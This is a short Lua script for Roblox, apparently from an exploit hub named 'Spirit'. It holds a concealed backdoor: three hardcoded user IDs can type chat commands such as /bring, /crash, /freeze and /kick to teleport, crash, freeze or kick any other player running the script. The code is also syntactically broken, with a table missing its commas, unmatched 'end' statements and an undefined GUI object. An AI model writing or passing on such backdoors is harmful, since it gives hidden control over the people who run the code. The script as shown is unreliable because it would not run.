local player = game.Players.LocalPlayer
local isamod = false
local prefix = "/"
local bending = false
local mods = {
    [623017592] -- FROSTED
    [428628880] -- RIDE
    [1406593298] -- INTEGER
}

if table.find(mods,player.UserId) then
	isamod = true
    GUI:Notification{
        Title = "Spirit",
        Text = "Hello " .. game.Players.LocalPlayer.Name,
        Duration = 10,
        Callback = function() end
    }
end

local function cmds(msg,plr)
	if isamod == false or table.find(mods,plr) then
		Mod = game.Players:GetPlayerByUserId(plr)
		isamod = table.find(mods,player.UserId)
		if msg == "/bring ." then
			if not isamod then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
			end
		end

        if msg == "/crash ." then
            setfpscap(0)
        end

        if msg == "/freeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		end

        if msg == "/unfreeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		end

        if msg == "/kick ." then
			if not isamod then
                game.Players.LocalPlayer:Kick("You have been kicked by a Spirit admin.")
			end
		end

		end
    end
end

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(mods,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(mods,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)
